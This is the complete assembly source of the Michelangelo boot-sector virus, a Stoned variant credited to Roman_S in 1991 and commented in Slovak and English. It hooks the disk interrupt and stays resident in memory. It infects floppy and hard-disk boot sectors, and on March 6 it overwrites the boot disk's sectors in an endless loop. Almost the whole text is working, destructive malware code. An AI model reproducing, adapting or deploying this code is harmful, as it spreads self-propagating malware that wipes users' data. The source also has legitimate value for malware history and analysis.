; ----------------------------------------------------------------------
;   Michaelangelo virus     Sourced by Roman_S (c) 1991
; ----------------------------------------------------------------------
;
;       Tento virus je modifikacia STONED virusu !
; Virus BOOTovateny rezidentny o dlzke 512 byte.
; Pri BOOTe z hard disku sa usadi na vrchole RAM
; a pri lubovolnom citani, alebo zapise na disk A: sa ho pokusi nakazit.
; Pri BOOTe z disku A: sa pokusi nainfikovat disk C:
; Znizuje velkost RAM o 2 Kb, je zaveseny na INT 13h (Disk I/O)
;
; !!!   Dna 6.3 premaze medium na ktorom prebehne BOOT  !!!
; ------------------------------------------------------------------------

vector_13   equ 4Ch         ;13h * 4 - vector INT 13h
ram_size    equ 413h            ;BIOS - Ram size in Kb
disk_run    equ 43Fh            ;BIOS - Running disk motor
boot_media  equ 15h         ;Offset off BOOT - media descriptor
date        equ 0306h           ;Date - 6.March
vir_len     equ vir_end - start     ;Virus length

code        segment byte public
        assume  cs:code, ds:code

        org 0000h
stoned_2    proc    far

start:      jmp main

boot        dw  offset reboot,0     ;Location for far jump
disk        db  2           ;Disk A: or C:
medium      dw  0Eh         ;Media descriptor
old_13      dw  0, 0            ;Old interrupt 13h

new_13:     push    ds          ;Backup DS,AX
        push    ax
        or  dl,dl           ;If DL != 0 (Drive A:) jump
        jnz ret_13
        xor ax,ax
        mov ds,ax           ;DS = 0000h
        test    byte ptr ds:disk_run,1  ;Running motor ?
        jnz ret_13          ;Jump if no
        pop ax          ;Restore AX,DS
        pop ds
        pushf               ;Emulate interrupt
        call    dword ptr cs:old_13
        pushf
        call    virus_13        ;Call virus body
        popf
        retf    2           ;Return from INT 13h  (IRET)

ret_13:     pop ax
        pop ds
        jmp dword ptr cs:old_13 ;JMP old INT 13h (& IRET)

virus_13    proc    near            ;Action virus intterrupt 13h
        push    ax          ;Backup registers
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    si
        push    di

        push    cs          ;Set DS=ES = CS
        pop ds
        push    cs
        pop es

        mov si,4            ;number of error repeats
error:      mov ax,201h         ;read 1 sector
        mov bx,offset buffer
        mov cx,1            ;Track 0, Sector 1
        xor dx,dx           ;Head 0, Drive A:
        pushf               ;Simulate interrupt
        call    dword ptr ds:old_13
        jnc read_ok
        xor ax,ax           ;Reset disk (Recalibrate)
        pushf
        call    dword ptr ds:old_13 ;Read BOOT Sector of drive A:
        dec si          ;Count last error
        jnz error
        jmp short virus_ret     ;Error read disk

read_ok:    xor si,si           ;Start of virus block
        cld
        lodsw
        cmp ax,[bx]         ;Compare 1st word of BOOT & Virus
        jne differs         ;Jump if not equal
        lodsw
        cmp ax,[bx+2]       ;Compare 2nd word
        je  virus_ret       ;Jump if equal

differs:    mov ax,301h         ;Write 1 Sector
        mov dh,1            ;head 1
        mov cl,3            ;3rd sector - 2nd part of FAT
        cmp byte ptr [bx+boot_media],0FDh   ;2 side & 9 Sectors per track ?
        je  loc
        mov cl,0Eh          ;14 sector
loc:        mov ds:medium,cx        ;Backup medium
        pushf
        call    dword ptr ds:old_13 ;Backup old BOOT record to 2nd part off FAT
        jc  virus_ret       ;Jump if error

        mov si,3BEh
        mov di,1BEh
        mov cx,21h
        cld
        rep movsw           ;Probably fills rest of 1st Kb

        mov ax,301h         ;Write 1 sector
        xor bx,bx           ;Start block virus
        mov cx,1            ;Track 0, sector 1
        xor dx,dx           ;Head 0, drive A:
        pushf
        call    dword ptr ds:old_13 ;Write new BOOT - virus

virus_ret:  pop di          ;Restore registers
        pop si
        pop es
        pop ds
        pop dx
        pop cx
        pop bx
        pop ax
        retn
virus_13    endp
  
main:       xor ax,ax           ;Set DS,SS = 0
        mov ds,ax
        cli             ;Disable interrupts
        mov ss,ax
        mov ax,7C00h        ;SS:SP = 7C00h
        mov sp,ax
        sti             ;Enable interrupts
        push    ds          ;Push 0000:7C00h
        push    ax
        mov ax,ds:vector_13     ;Save old interrupt 13h
        mov ds:old_13+7C00h,ax  ;Offset
        mov ax,ds:vector_13+2
        mov ds:old_13+7C02h,ax  ;Segment
        mov ax,ds:ram_size      ;AX = total memory in Kb
        dec ax          ;Reserve 2 Kb
        dec ax
        mov ds:ram_size,ax      ;Set new value
        mov cl,6            ;Size of segment
        shl ax,cl           ;Convert to segment address
        mov es,ax
        mov word ptr boot+7c02h,ax  ;Save start of virus place

        mov ax,offset new_13    ;Redefine vector 13h
        mov ds:vector_13,ax     ;Offset
        mov ds:vector_13+2,es   ;Segment

        mov cx,vir_len

        mov si,7C00h        ;Begin virus
        xor di,di
        cld
        rep movsb           ;Transfer executive routine
        jmp dword ptr cs:boot+7C00h ;Jump next line (reboot)

reboot:     xor ax,ax
        mov es,ax
        int 13h         ;Reset disk
        push    cs
        pop ds          ;Set DS = CS

; Read backup BOOT (original) from A: or C: to 7C00h
        mov ax,201h         ;Read 1 sector
        mov bx,7C00h        ;Address of boot program
        mov cx,ds:medium
        cmp cx,7
        jne loc_2           ;Jump if not equal
        mov dx,80h          ;Head 0, Drive C:
        int 13h         ;Read backup BOOT
        jmp short date_test     ;Idem z C: nema zmysel pokusit sa ho opat nakazit

; Boot prebehol z A: -  pokus o nakazenie C:
loc_2:      mov cx,ds:medium        ;CH - track,  CL - sector
        mov dx,100h         ;Head 0, Drive A:
        int 13h         ;Read backup BOOT
        jc  date_test       ;Jump if error

        push    cs          ;Set ES to CS
        pop es
        mov ax,201h         ;Read 1 sector
        mov bx,offset buffer
        mov cx,1            ;Sector 1, track 0
        mov dx,80h          ;Drive C:  head 0
        int 13h         ;Read Boot of disk C: to bafer
        jc  date_test       ;Jump if error

        xor si,si           ;Begin virus block
        cld
        lodsw
        cmp ax,[bx]         ;Compare virus & boot (1st word)
        jne infect          ;Differs - Jump to infect C:
        lodsw
        cmp ax,[bx+2]       ;2nd word
        jne infect          ;Differs - Jump to infect C:

; Testovanie datumu na zahajenie diverznej cinosti
date_test:  xor cx,cx
        mov ah,4
        int 1Ah         ;Read date cx=year, dx=mon/day
        cmp dx,date         ;Date = 6.3 ?
        je  kill_action     ;Kill if yes
        retf                ;Jump to original Boot - 0000:7C00h

kill_action:    xor dx,dx           ;Drive A: head 0
        mov cx,1            ;Sector 1, track 0

next_track: mov ax,309h         ;Write 9 sectors
        mov si,ds:medium
        cmp si,3
        je  loc_3
        mov al,0Eh          ;0Eh sectors
        cmp si,0Eh
        je  loc_3
        mov dl,80h          ;Hard disk, 11h sectors
        mov byte ptr ds:disk,4  ;4 head
        mov al,11h

loc_3:      mov bx,5000h        ;Read from 5000h - ramdom
        mov es,bx
        int 13h         ;Write sectors from mem es:bx
        jnc ok          ;Jump if no error
        xor ah,ah
        int 13h         ;Recalibrate disk

ok:     inc dh          ;Next head
        cmp dh,ds:disk      ;Last head ?
        jb  next_track

        xor dh,dh
        inc ch          ;Next track
        jmp short next_track    ;Nekonecne mazanie

infect:     mov cx,7            ;Sector 7 - 2nd part of FAT
        mov ds:medium,cx        ;Save medium (Hard disk)
        mov ax,301h         ;Write 1 sector
        mov dx,80h          ;Hard disk C:
        int 13h         ;Backup original Boot to 2nd FAT
        jc  date_test       ;Jump if error

        mov si,3BEh
        mov di,1BEh
        mov cx,21h
        rep movsw

        mov ax,301h         ;Write 1 sector
        xor bx,bx           ;Set to begin virus block
        inc cl          ;CL=1 -> 1 sector
        int 13h         ;Write virus to BOOT
        jmp short date_test

        db  16 dup (0)      ;Free byte
vir_end     label byte

        org 200h-2
        db  55h, 0AAh       ;Last 2 bytes (mark end of BOOT)
stoned_2    endp

        org 200h
buffer      label byte

code        ends
        end start
        